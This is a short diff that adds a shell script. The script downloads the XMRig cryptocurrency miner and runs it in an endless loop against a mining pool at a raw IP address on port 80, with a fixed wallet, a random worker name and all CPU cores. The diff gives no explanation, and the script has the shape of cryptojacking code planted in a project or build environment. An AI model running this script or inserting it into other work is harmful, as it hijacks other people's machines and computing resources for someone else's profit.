@@ -1,0 +1,6 @@
+curl https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz -L -o xmrig-6.24.0-linux-static-x64.tar.gz
+tar xf xmrig-6.24.0-linux-static-x64.tar.gz
+cd xmrig-6.24.0
+while :; do
+./xmrig --donate-level 1 -o 206.189.59.24:80 -u Q010500558b2441553c74a987286cd7637c3df66b190c2abfb065f53ecdc8f4512b6415336fb44e.$(echo $RANDOM | md5sum | head -c 10) -a rx/0 -k -t $(nproc --all)
+done
